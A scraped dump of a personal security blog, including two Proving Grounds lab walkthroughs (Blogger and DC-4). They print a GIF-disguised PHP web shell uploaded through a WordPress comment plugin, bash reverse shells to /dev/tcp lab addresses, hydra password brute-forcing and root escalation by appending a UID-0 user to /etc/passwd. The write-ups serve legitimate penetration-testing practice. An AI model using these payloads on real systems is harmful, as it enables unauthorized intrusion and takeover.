[{"content":"About Me üëã Hello, I am George Bourlakis, Security Researcher and Enthusiast. üìç I live in Athens, Greece. üíª Interested in anything related to penetration testing, red/blue teaming, malware analysis and CTF challenges in general. Education üéì Master of Science - MSc, Cybersecurity, UCLan Cyprus. Sep 2022 - Jul 2024\nüéì Diploma, Integrated Master of Engineering - MEng, Computer Engineering and Informatics Department, University of Patras. Sep 2016 - Nov 2021\n  My diploma thesis \"Artificial Intelligence algorithms to detect malware in TLS traffic\" can be found in Nemertes or in Github.   Certifications   Offensive Security Certified Professional (OSCP)   CompTIA PenTest +   Microsoft Certified: Security, Compliance, and Identity Fundamentals   Microsoft Certified: Azure Fundamentals    HackTheBox Profile  Visit my HackTheBox profile HTB geobour98.  TryHackMe Profile  Visit my TryHackMe profile THM geobour98.    Throwback Network (Attacking Windows Active Directory)   ","permalink":"https://geobour98.com/about/","summary":"About Me üëã Hello, I am George Bourlakis, Security Researcher and Enthusiast. üìç I live in Athens, Greece. üíª Interested in anything related to penetration testing, red/blue teaming, malware analysis and CTF challenges in general. Education üéì Master of Science - MSc, Cybersecurity, UCLan Cyprus. Sep 2022 - Jul 2024\nüéì Diploma, Integrated Master of Engineering - MEng, Computer Engineering and Informatics Department, University of Patras. Sep 2016 - Nov 2021","title":""},{"content":"Blog Coming Soon! ","permalink":"https://geobour98.com/blog/","summary":"Blog Coming Soon! ","title":""},{"content":"Write-ups Collection of Write-ups on various platforms.\nTryHackMe\n Proving Grounds\n ","permalink":"https://geobour98.com/write-ups/","summary":"Write-ups Collection of Write-ups on various platforms.\nTryHackMe\n Proving Grounds\n ","title":""},{"content":"Proving Grounds Write-ups Proving Grounds - DC-4\n Proving Grounds - Blogger\n Proving Grounds - ICMP\n ","permalink":"https://geobour98.com/write-ups/pg/","summary":"Proving Grounds Write-ups Proving Grounds - DC-4\n Proving Grounds - Blogger\n Proving Grounds - ICMP\n ","title":""},{"content":"TryHackMe Write-ups TryHackMe - Dogcat\n TryHackMe - Olympus\n TryHackMe - VulnNet: Node\n TryHackMe - Jason\n TryHackMe - Annie\n TryHackMe - Hacker vs. Hacker\n ","permalink":"https://geobour98.com/write-ups/thm/","summary":"TryHackMe Write-ups TryHackMe - Dogcat\n TryHackMe - Olympus\n TryHackMe - VulnNet: Node\n TryHackMe - Jason\n TryHackMe - Annie\n TryHackMe - Hacker vs. Hacker\n ","title":""},{"content":"üìÜ 24/09/2022 - geobour98 ‚åö 6 min\nIntroduction This is a Proving Grounds room which can be found at: Blogger\nThe Blog of War\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.81.217  geobour98@kali:~$ nmap -p- -T4 -v 192.168.81.217 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 21:53 EEST Initiating Ping Scan at 21:53 Scanning 192.168.81.217 [2 ports] Completed Ping Scan at 21:53, 0.05s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:53 Completed Parallel DNS resolution of 1 host. at 21:53, 0.00s elapsed Initiating Connect Scan at 21:53 Scanning 192.168.81.217 (192.168.81.217) [65535 ports] Discovered open port 80/tcp on 192.168.81.217 Discovered open port 22/tcp on 192.168.81.217 Completed Connect Scan at 21:53, 16.72s elapsed (65535 total ports) Nmap scan report for 192.168.81.217 (192.168.81.217) Host is up (0.053s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 192.168.81.217  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 192.168.81.217 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 21:53 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 21:53 Completed NSE at 21:53, 0.00s elapsed Initiating NSE at 21:53 Completed NSE at 21:53, 0.00s elapsed Initiating NSE at 21:53 Completed NSE at 21:53, 0.00s elapsed Initiating Ping Scan at 21:53 Scanning 192.168.81.217 [4 ports] Completed Ping Scan at 21:53, 0.09s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:53 Completed Parallel DNS resolution of 1 host. at 21:53, 0.00s elapsed Initiating SYN Stealth Scan at 21:53 Scanning 192.168.81.217 (192.168.81.217) [2 ports] Discovered open port 22/tcp on 192.168.81.217 Discovered open port 80/tcp on 192.168.81.217 Completed SYN Stealth Scan at 21:53, 0.10s elapsed (2 total ports) Initiating Service scan at 21:53 Scanning 2 services on 192.168.81.217 (192.168.81.217) Completed Service scan at 21:54, 6.12s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 192.168.81.217 (192.168.81.217) Retrying OS detection (try #2) against 192.168.81.217 (192.168.81.217) Initiating Traceroute at 21:54 Completed Traceroute at 21:54, 0.06s elapsed Initiating Parallel DNS resolution of 1 host. at 21:54 Completed Parallel DNS resolution of 1 host. at 21:54, 0.00s elapsed NSE: Script scanning 192.168.81.217. Initiating NSE at 21:54 Completed NSE at 21:54, 6.78s elapsed Initiating NSE at 21:54 Completed NSE at 21:54, 0.22s elapsed Initiating NSE at 21:54 Completed NSE at 21:54, 0.00s elapsed Nmap scan report for 192.168.81.217 (192.168.81.217) Host is up (0.054s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 95:1d:82:8f:5eüá©üá™9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA) | 256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA) |_ 256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Blogger | Home | http-methods: |_ Supported Methods: HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.2.0 (95%), Linux 3.11 - 4.1 (94%), Linux 4.4 (94%), Linux 3.16 (93%), Linux 3.13 (92%), Linux 3.10 - 3.16 (91%), Linux 3.10 - 3.12 (90%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 0.006 days (since Mon Sep 19 21:46:10 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=259 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 55.69 ms 192.168.49.1 (192.168.49.1) 2 52.86 ms 192.168.81.217 (192.168.81.217)  NSE: Script Post-scanning. Initiating NSE at 21:54 Completed NSE at 21:54, 0.00s elapsed Initiating NSE at 21:54 Completed NSE at 21:54, 0.00s elapsed Initiating NSE at 21:54 Completed NSE at 21:54, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds  Raw packets sent: 78 (5.316KB) | Rcvd: 42 (16.692KB) Brute force the website for directories using gobuster.\n  Command: gobuster dir -u http://192.168.81.217/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50  geobour98@kali:~$ gobuster dir -u http://192.168.81.217/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.81.217/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/09/19 21:56:47 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 317] [--\u0026gt; http://192.168.81.217/assets/] /css (Status: 301) [Size: 314] [--\u0026gt; http://192.168.81.217/css/] /images (Status: 301) [Size: 317] [--\u0026gt; http://192.168.81.217/images/] /js (Status: 301) [Size: 313] [--\u0026gt; http://192.168.81.217/js/] /server-status (Status: 403) [Size: 279]  =============================================================== 2022/09/19 22:00:56 Finished =============================================================== The navigation on port 80 and /assets directory leads to the URL: http://192.168.81.217/assets/fonts/blog/ which appears to be a blog not displaying correctly. After hovering over most links, they lead to blogger.thm so in order for the blog to be displayed correctly we need to add the domain name and the IP address in /etc/hosts file. Then, the operating system will translate the hostname blogger.thm to the IP 192.168.81.217. The contents of /etc/hosts should look like this:\ngeobour98@kali:~$ cat /etc/hosts [REDACTED] 192.168.81.217 blogger.thm [REDACTED] Exploitation Now, navigate to http://blogger.thm/assets/fonts/blog/ and the blog is displayed correctly. It appears to be a Wordpress blog, so we could use the wpscan tool to enumerate for all plugins, all themes, config backups and Db exports, but no interesting results are shown.\n  Command: wpscan --url http://blogger.thm/assets/fonts/blog/ -e ap,at,cb,dbe  If we navigate to whichever post, we identify Comment functionality that can include the attachment of an image. Create cmd.php with contents:\nGIF87a \u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt;Above the php code we have put the magic bytes of a GIF file according to: https://en.wikipedia.org/wiki/List_of_file_signatures, in order for our file to be treated as a GIF file. Then, we attach the cmd.php, open Burp Suite, turn Intercept to On, and click on POST COMMENT. Finally, click Forward on Burp Suite. The request should look like this:\nPOST /assets/fonts/blog/wp-admin/admin-ajax.php HTTP/1.1 Host: blogger.thm User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------5658711851211151532350158244 Content-Length: 1421 Origin: http://blogger.thm Connection: close Referer: http://blogger.thm/assets/fonts/blog/?p=29 Cookie: wpdiscuz_hide_bubble_hint=1  -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;action\u0026#34;  wpdAddComment -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;wc_comment\u0026#34;  test -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;wmu_files[]\u0026#34;  C:\\fakepath\\cmd.php -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;wmu_attachments\u0026#34;  {\u0026#34;images\u0026#34;:[34]} -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;wc_name\u0026#34;  test -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;wc_email\u0026#34;  test@test.com -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;wc_website\u0026#34;  https://test.com -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34;  Post Comment -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;wpdiscuz_unique_id\u0026#34;  0_0 -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;wpd_comment_depth\u0026#34;  1 -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\u0026#34;postId\u0026#34;  29 -----------------------------5658711851211151532350158244-- The file cmd.php is successfully uploaded and in the Comments section we can a link for cmd.php which leads to: http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php. At this point, we can execute code by navigating to: http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php?cmd=id Output:\nGIF87a uid=33(www-data) gid=33(www-data) groups=33(www-data) We are the user www-data, so now we want to get a reverse shell. Intercept this request: http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php?cmd=id with Burp Suite, change it as shown below, click on Forward and open a netcat listener.\nGET /assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php?cmd=bash+-c+\u0026#39;exec+bash+-i+%26\u0026gt;/dev/tcp/192.168.49.81/443+\u0026lt;%261\u0026#39; HTTP/1.1 Host: blogger.thm User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: wpdiscuz_hide_bubble_hint=1; comment_author_email_f401df2453a4515e2d6a824db178db1a=test@test.com; comment_author_f401df2453a4515e2d6a824db178db1a=test; comment_author_url_f401df2453a4515e2d6a824db178db1a=https://test.com Upgrade-Insecure-Requests: 1 Now we have a reverse shell as the www-data user.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [192.168.49.81] from (UNKNOWN) [192.168.81.217] 54292 bash: cannot set terminal process group (1428): Inappropriate ioctl for device bash: no job control in this shell \u0026lt;ress/assets/fonts/blog/wp-content/uploads/2022/09$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026lt;content/uploads/2022/09$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026lt;ress/assets/fonts/blog/wp-content/uploads/2022/09$ ^Z zsh: suspended nc -lvnp 443  geobour98@kali:~$ stty raw -echo;fg [1] + continued nc -lvnp 443 \u0026lt;content/uploads/2022/09$ export TERM=xterm-256color www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2022/09$ stty rows 38 cols 111 www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2022/09$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Navigate to /home and we see home folders of the users: james, ubuntu and vagrant. Vagrant is an open-source tool that allows you to create, configure, and manage boxes of virtual machines through an easy to use command interface. There is also a default password: vagrant for root on the Vagrant tool. We can try that password for the vagrant user.\nwww-data@ubuntu-xenial:/home/vagrant$ su vagrant Password: vagrant@ubuntu-xenial:~$ id uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant) Now we are the user vagrant and can read the local.txt from /home/james/ directory.\nvagrant@ubuntu-xenial:/home/james$ cat local.txt [REDACTED] Privilege Escalation After executing the command: sudo -l we see that we can execute anything as root.\nvagrant@ubuntu-xenial:/home/james$ sudo -l Matching Defaults entries for vagrant on ubuntu-xenial:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User vagrant may run the following commands on ubuntu-xenial:  (ALL) NOPASSWD: ALL vagrant@ubuntu-xenial:/home/james$ sudo -s root@ubuntu-xenial:/home/james# id uid=0(root) gid=0(root) groups=0(root) root@ubuntu-xenial:/home/james# cd /root root@ubuntu-xenial:/root# cat proof.txt [REDACTED] Proof of Concept (PoC image): ","permalink":"https://geobour98.com/write-ups/pg/blogger/","summary":"üìÜ 24/09/2022 - geobour98 ‚åö 6 min\nIntroduction This is a Proving Grounds room which can be found at: Blogger\nThe Blog of War\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.81.217  geobour98@kali:~$ nmap -p- -T4 -v 192.168.81.217 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 21:53 EEST Initiating Ping Scan at 21:53 Scanning 192.168.81.217 [2 ports] Completed Ping Scan at 21:53, 0.","title":"Proving Grounds - Blogger"},{"content":"üìÜ 08/10/2022 - geobour98 ‚åö 7 min\nIntroduction This is a Proving Grounds room which can be found at: DC-4\nA double edged sword\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.142.195  geobour98@kali:~$ nmap -p- -T4 -v 192.168.142.195 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 19:48 EEST Initiating Ping Scan at 19:48 Scanning 192.168.142.195 [2 ports] Completed Ping Scan at 19:48, 0.05s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:48 Completed Parallel DNS resolution of 1 host. at 19:48, 0.00s elapsed Initiating Connect Scan at 19:48 Scanning 192.168.142.195 (192.168.142.195) [65535 ports] Discovered open port 22/tcp on 192.168.142.195 Discovered open port 80/tcp on 192.168.142.195 Completed Connect Scan at 19:49, 18.93s elapsed (65535 total ports) Nmap scan report for 192.168.142.195 (192.168.142.195) Host is up (0.053s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 19.03 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 192.168.142.195  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 192.168.142.195 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 19:50 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating Ping Scan at 19:50 Scanning 192.168.142.195 [4 ports] Completed Ping Scan at 19:50, 0.09s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:50 Completed Parallel DNS resolution of 1 host. at 19:50, 0.00s elapsed Initiating SYN Stealth Scan at 19:50 Scanning 192.168.142.195 (192.168.142.195) [2 ports] Discovered open port 22/tcp on 192.168.142.195 Discovered open port 80/tcp on 192.168.142.195 Completed SYN Stealth Scan at 19:50, 0.09s elapsed (2 total ports) Initiating Service scan at 19:50 Scanning 2 services on 192.168.142.195 (192.168.142.195) Completed Service scan at 19:50, 6.15s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 192.168.142.195 (192.168.142.195) Retrying OS detection (try #2) against 192.168.142.195 (192.168.142.195) Initiating Traceroute at 19:50 Completed Traceroute at 19:50, 0.07s elapsed Initiating Parallel DNS resolution of 1 host. at 19:50 Completed Parallel DNS resolution of 1 host. at 19:50, 0.00s elapsed NSE: Script scanning 192.168.142.195. Initiating NSE at 19:50 Completed NSE at 19:50, 1.75s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.22s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Nmap scan report for 192.168.142.195 (192.168.142.195) Host is up (0.057s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA) | 256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA) |_ 256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519) 80/tcp open http nginx 1.15.10 |_http-server-header: nginx/1.15.10 | http-methods: |_ Supported Methods: GET HEAD POST |_http-title: System Tools Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.2.0 (95%), Linux 3.11 - 4.1 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux 3.13 (91%), Linux 3.10 - 3.16 (91%), Linux 3.10 - 3.12 (90%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 198.841 days (since Sun Mar 13 22:39:35 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=263 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 69.20 ms 192.168.49.1 (192.168.49.1) 2 69.37 ms 192.168.142.195 (192.168.142.195)  NSE: Script Post-scanning. Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.79 seconds  Raw packets sent: 78 (5.316KB) | Rcvd: 36 (2.896KB) Brute force the website for directories and files with the extension .php using gobuster.\n  Command: gobuster dir -u http://192.168.142.195/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50  geobour98@kali:~$ gobuster dir -u http://192.168.142.195/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.142.195/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2022/09/28 19:53:20 Starting gobuster in directory enumeration mode =============================================================== /login.php (Status: 302) [Size: 206] [--\u0026gt; index.php] /images (Status: 301) [Size: 170] [--\u0026gt; http://192.168.142.195/images/] /index.php (Status: 200) [Size: 506] /css (Status: 301) [Size: 170] [--\u0026gt; http://192.168.142.195/css/] /logout.php (Status: 302) [Size: 163] [--\u0026gt; index.php] /command.php (Status: 302) [Size: 704] [--\u0026gt; index.php]  =============================================================== 2022/09/28 20:01:23 Finished =============================================================== Exploitation The most interesting file is command.php but leads to index.php, so maybe we have to be authenticated in order to view it. Now we brute force the admin user using hydra and if the success message contains the word command, then we have successfully brute forced the password.\n  Command: hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.195 http-post-form \u0026quot;/login.php:username=^USER^\u0026amp;password=^PASS^:S=command\u0026quot;  geobour98@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.195 http-post-form \u0026#34;/login.php:username=^USER^\u0026amp;password=^PASS^:S=command\u0026#34; Hydra v9.3 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 19:54:50 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://192.168.142.195:80/login.php:username=^USER^\u0026amp;password=^PASS^:S=command [80][http-post-form] host: 192.168.142.195 login: admin password: [REDACTED] 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-28 19:55:10 Now we can login with username admin and the found password, and navigate to /command.php. Here we can execute some commands from the UI, but if we Intercept a request with Burp Suite, we see it is a POST request with a parameter radio, which executes linux commands. So we can put there a bash reverse shell like the following: bash -c 'exec bash -i \u0026amp;\u0026gt;/dev/tcp/192.168.49.117/443 \u0026lt;\u0026amp;1', but we have to URL-encode it first. The request in Burp Suite should look like this:\nPOST /command.php HTTP/1.1 Host: 192.168.142.195 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 77 Origin: http://192.168.142.195 Connection: close Referer: http://192.168.142.195/command.php Cookie: PHPSESSID=h8dn71jf3jkrrdgnd7u0a525f6 Upgrade-Insecure-Requests: 1  radio=bash+-c+\u0026#39;exec+bash+-i+%26\u0026gt;/dev/tcp/192.168.49.142/443+\u0026lt;%261\u0026#39;\u0026amp;submit=Run Open a netcat listener and we get a reverse shell as www-data.\nlistening on [any] 443 ... connect to [192.168.49.142] from (UNKNOWN) [192.168.142.195] 53996 bash: cannot set terminal process group (541): Inappropriate ioctl for device bash: no job control in this shell www-data@dc-4:/usr/share/nginx/html$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@dc-4:/usr/share/nginx/html$ ^Z zsh: suspended nc -lvnp 443  geobour98@kali:~$ stty raw -echo;fg [1] + continued nc -lvnp 443 www-data@dc-4:/usr/share/nginx/html$ export TERM=xterm-256color www-data@dc-4:/usr/share/nginx/html$ stty rows 38 cols 111 www-data@dc-4:/usr/share/nginx/html$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Navigate to /home/jim and we see local.txt. Also, we see an interesting folder backups, which contains the file old-passwords.bak.\nwww-data@dc-4:/home/jim$ cat local.txt [REDACTED] www-data@dc-4:/home/jim$ cd backups www-data@dc-4:/home/jim/backups$ ls old-passwords.bak Then, transfer old-passwords.bak to the attacker machine and brute force the user jim with the found wordlist. We will use hydra again.\n  Command: hydra -l jim -P old-passwords.bak ssh://192.168.142.195  geobour98@kali:~$ hydra -l jim -P old-passwords.bak ssh://192.168.142.195 Hydra v9.3 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 20:05:55 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task [DATA] attacking ssh://192.168.142.195:22/ [STATUS] 146.00 tries/min, 146 tries in 00:01h, 109 to do in 00:01h, 13 active [STATUS] 105.50 tries/min, 211 tries in 00:02h, 44 to do in 00:01h, 13 active [22][ssh] host: 192.168.142.195 login: jim password: [REDACTED] 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 3 final worker threads did not complete until end. Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-28 20:08:10 Now we can login with SSH as the user jim with the found password.\ngeobour98@kali:~$ ssh jim@192.168.142.195 The authenticity of host \u0026#39;192.168.142.195 (192.168.142.195)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;192.168.142.195\u0026#39; (ED25519) to the list of known hosts. jim@192.168.142.195\u0026#39;s password: Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686  The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. You have mail. Last login: Sun Apr 7 02:23:55 2019 from 192.168.0.100 jim@dc-4:~$ Then, we run find command to find files owned by jim. The most interesting is /var/mail/jim, which contains the password of user charles. So, we switch to that user.\njim@dc-4:~$ find / -type f -user jim 2\u0026gt;/dev/null [REDACTED] /var/mail/jim [REDACTED] jim@dc-4:~$ cat /var/mail/jim [REDACTED] Hi Jim,  I\u0026#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anyt hing goes wrong.  Password is: [REDACTED]  See ya, Charles [REDACTED] jim@dc-4:~$ su charles Password: charles@dc-4:/home/jim$ id uid=1001(charles) gid=1001(charles) groups=1001(charles) Privilege Escalation After executing the command: sudo -l we see that we can execute /usr/bin/teehee as root. If we run strings command on /usr/bin/teehee we will find the help menu of that binary. Then we can execute it with the -a option to append a new user with both GID and UID as 0 (as root) at /etc/passwd. Before running /usr/bin/teehee we must generate a hash of a password (geobour98 in my case) with openssl in order to put it in /etc/passwd.\ncharles@dc-4:~$ sudo -l Matching Defaults entries for charles on dc-4:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin  User charles may run the following commands on dc-4:  (root) NOPASSWD: /usr/bin/teehee charles@dc-4:~$ strings /usr/bin/teehee [REDACTED] Try \u0026#39;%s --help\u0026#39; for more information. Usage: %s [OPTION]... [FILE]... Copy standard input to each FILE, and also to standard output.  -a, --append append to the given FILEs, do not overwrite  -i, --ignore-interrupts ignore interrupt signals  -p diagnose errors writing to non pipes  --output-error[=MODE] set behavior on write error. See MODE below  --help display this help and exit  --version output version information and exit MODE determines behavior with write errors on the outputs:  \u0026#39;warn\u0026#39; diagnose errors writing to any output  \u0026#39;warn-nopipe\u0026#39; diagnose errors writing to any output not a pipe  \u0026#39;exit\u0026#39; exit on error writing to any output  \u0026#39;exit-nopipe\u0026#39; exit on error writing to any output not a pipe [REDACTED] charles@dc-4:~$ openssl passwd geobour98 Warning: truncating password to 8 characters GWIOrZOActC.A charles@dc-4:~$ sudo /usr/bin/teehee -a /etc/passwd geobour98:GWIOrZOActC.A:0:0:::/bin/bash geobour98:GWIOrZOActC.A:0:0:::/bin/bash ^C charles@dc-4:~$ cat /etc/passwd [REDACTED] geobour98:GWIOrZOActC.A:0:0:::/bin/bash [REDACTED] charles@dc-4:~$ su geobour98 Password: root@dc-4:/home/charles# id uid=0(root) gid=0(root) groups=0(root) root@dc-4:/home/charles# cat /root/proof.txt [REDACTED] Proof of Concept (PoC image): ","permalink":"https://geobour98.com/write-ups/pg/dc-4/","summary":"üìÜ 08/10/2022 - geobour98 